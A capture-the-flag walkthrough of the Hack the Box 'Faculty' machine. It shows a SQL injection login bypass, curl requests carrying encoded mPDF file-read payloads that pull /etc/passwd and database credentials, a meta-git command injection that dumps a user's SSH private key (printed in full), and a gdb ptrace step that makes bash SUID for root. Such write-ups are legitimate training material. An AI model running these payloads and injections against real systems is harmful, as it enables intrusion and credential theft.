---
title: "Hack the Box - Faculty"
slug: "hack-the-box-faculty"
date: "2024-03-14"
excerpt: "Faculty is a medium Linux machine that features a PHP web application that uses a library which is vulnerable to local file inclusion. Exploiting the LFI in this library reveals a password which can be used to log in as a low-level user called `gbyolo` over SSH. The user `gbyolo` has permission to run an `npm` package called `meta-git` as the `developer` user. The version of the `meta-git` installed on this box is vulnerable to code injection, which can be exploited to escalate the privileges to the user `developer`. The privilege escalation to `root` can be performed by exploiting the `CAP_SYS_PTRACE` capability to inject shellcode into a process running as `root`."
cover: "cover.png"
tags:
  - CAP_SYS_PTRACE
  - SQLi
  - LFI
  - NPM
---

## Foothold
### NMAP

```bash
nmap -sC -sV -v -T4 -oN scans/nmap.txt faculty.htb
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: School Faculty Scheduling System
|_Requested resource was login.php
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

### Website

Visiting `faculty.htb` we get a website with a form.

![](./20220710222242.png)  

Let's fuzz the site's directories to see if there's any other pages of interest.

```bash
gobuster dir -u faculty.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

We get a hit on an admin page.

![](./20220710222603.png)  

If we visit the `/admin` page we are presented with a login form.

![](./20220710222647.png)  

We can try a simple SQLi payload to try accessing the page without valid credentials.

![](./20220710222822.png)  

It works! We now have access to the administration dashboard.

![](./20220710222859.png)  

It tried a few simple payloads on the inputs to test for things like SSTI with no success. However the PDF download button looks interesting.

![](./20220710223130.png)  

If we click it while intercepting with Burp we see what looks to be encoded data.

![](./20220710223237.png)  

If we base64 decode, then URL decode twice we get the HTML used to form the PDF document.

```html
<h1><a name="top"></a>faculty.htb</h1><h2>Subjects</h2><table>	<thead>		<tr>			<th class="text-center">#</th>			<th class="text-left">Subject</th>			<th class="text-left">Description</th>			</tr></thead><tbody><tr><td class="text-center">1</td><td class="text-center"><b>DBMS</b></td><td class="text-center"><small><b>Database Management System</b></small></td></tr><tr><td class="text-center">2</td><td class="text-center"><b>Mathematics</b></td><td class="text-center"><small><b>Mathematics</b></small></td></tr><tr><td class="text-center">3</td><td class="text-center"><b>English</b></td><td class="text-center"><small><b>English</b></small></td></tr><tr><td class="text-center">4</td><td class="text-center"><b>Computer Hardware</b></td><td class="text-center"><small><b>Computer Hardware</b></small></td></tr><tr><td class="text-center">5</td><td class="text-center"
```

Forwarding the request, we are taken to another page with a randomised filename in the `/mpdf/tmp` directory.

![](./20220710223519.png)  

If we check the properties of the pdf we downloaded we can see it's using `mpdf` version 6.0.

![](./20220710224111.png)  

After some research, there's a [PoC](https://github.com/mpdf/mpdf/issues/356) which abuses tags making it possible to extract sensitive files and source code from the application backend. We can create our payload using [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)URL_Encode(false)To_Base64('A-Za-z0-9%2B/%3D')&input=PGFubm90YXRpb24gZmlsZT0iL2V0Yy9wYXNzd2QiIGNvbnRlbnQ9Ii9ldGMvcGFzc3dkIiBpY29uPSJHcmFwaCIgdGl0bGU9IkF0dGFjaGVkIEZpbGU6IC9ldGMvcGFzc3dkIiBwb3MteD0iMTk1IiAvPg).

![](./20220710233610.png)  

```bash
curl http://faculty.htb/admin/download.php -H "Cookie: PHPSESSID=ddbue42s8mg2kds8fo10hf9hib" -d "pdf=JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL2V0Yy9wYXNzd2QlMjUyMiUyNTIwY29udGVudD0lMjUyMi9ldGMvcGFzc3dkJTI1MjIlMjUyMGljb249JTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZT0lMjUyMkF0dGFjaGVkJTI1MjBGaWxlOiUyNTIwL2V0Yy9wYXNzd2QlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF"

OK1KeWrSnMPFyQfu63jodLNimY.pdf
```

Then run curl with the pdf filename provided to download the file.

```bash
curl http://faculty.htb/mpdf/tmp/OK1KeWrSnMPFyQfu63jodLNimY.pdf -o 1.pdf
```

When we open the pdf file there should be a small yellow symbol which when we click on it we can view the contents of the file we specified in the payload, in this case it will be `/etc/passwd`.

![](./20220710234425.png)  

After looking around the site more particularly the schedule page, there's a `post` request made. If you change the method to `get` it returns a stack trace.

![](./20220710235017.png)  

Using the exploit, let's get retrieve the source code from the `/var/www/scheduling/admin/admin_class.php` file.

```html
<annotation file=" /var/www/scheduling/admin/admin_class.php" content=" /var/www/scheduling/admin/admin_class.php" icon="Graph" title="Attached File:  /var/www/scheduling/admin/admin_class.php" pos-x="195" />
```

Using the new payload, let's make a request to create and download the file.

```bash
curl http://faculty.htb/admin/download.php -H "Cookie: PHPSESSID=bpe41jvnov0l1t2vi7fii3naj2" -d "pdf=JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyNTIyJTI1MjBjb250ZW50PSUyNTIyJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyNTIyJTI1MjBpY29uPSUyNTIyR3JhcGglMjUyMiUyNTIwdGl0bGU9JTI1MjJBdHRhY2hlZCUyNTIwRmlsZTolMjUyMCUyNTIwL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9hZG1pbl9jbGFzcy5waHAlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF"

OKqZl2kKz0m379sbuhYogLpOCJ.pdf
```

```bash
curl http://faculty.htb/mpdf/tmp/OKqZl2kKz0m379sbuhYogLpOCJ.pdf -o 2.pdf
```

![](./20220710235251.png)  

The `admin_class.php` file isn't particularly interesting but a reference to `db_connect.php` is. Let's exfiltrate this file and hopefully get some credentials.

```bash
curl http://faculty.htb/admin/download.php -H "Cookie: PHPSESSID=bpe41jvnov0l1t2vi7fii3naj2" -d "pdf=JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2RiX2Nvbm5lY3QucGhwJTI1MjIlMjUyMGNvbnRlbnQ9JTI1MjIlMjUyMC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwaWNvbj0lMjUyMkdyYXBoJTI1MjIlMjUyMHRpdGxlPSUyNTIyQXR0YWNoZWQlMjUyMEZpbGU6JTI1MjAlMjUyMC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF"

OKn6AZXbKONMvQ4pBHIJsViyxe.pdf
```

```bash
curl http://faculty.htb/mpdf/tmp/OKn6AZXbKONMvQ4pBHIJsViyxe.pdf -o 3.pdf
```

```php
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

We're able to extract credentials, let's try reusing these for the other active accounts found in `/etc/passwd`.

Let's try SSH'ing in using these credentials.

![](./20220711002119.png)  

## Privilege Escalation

If we check our permissions using `sudo -l` we see that the `developer` user can run `meta-git`.

![](./20220711002258.png)  

After doing some research on `meta-git vulnerabilities` we find an [RCE via insecure command formatting](https://hackerone.com/reports/728040).

The following command should execute `whoami` as the `developer` user.

```bash
sudo -u developer meta-git clone 'sss | whoami'
```

![](./20220711003317.png)  

Now let's see if the `developer` user has an `id_rsa` we can use to SSH as them.

```bash
sudo -u developer meta-git clone 'sss | cat /home/developer/.ssh/id_rsa'
```

And we get the SSH private key!

```text
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
chmod 600 id_rsa
ssh developer@faculty.htb -i id_rsa
```

And we're in!

![](./20220711003541.png)  

### Root

If we run `id` we can see that we're part of the `debug` group. If we check out capabilities, we can also use `gdb`.

```bash
getcap /usr/bin/gdb

/usr/bin/gdb = cap_sys_ptrace+ep
```

![](./20220711004707.png)  

We can use an already running process running as root and use `gdb` to execute commands under that process.

```bash
ps aux | grep root | grep python3
```

![](./20220711005004.png)  

We can now use `gdb` to make `bash` an SUID.

```bash
gdb -p 695

call system('chmod u+s /bin/bash')

quit
```

Now we should be able to run `bash` as root.

```bash
bash -p
```

![](./20220711005653.png)  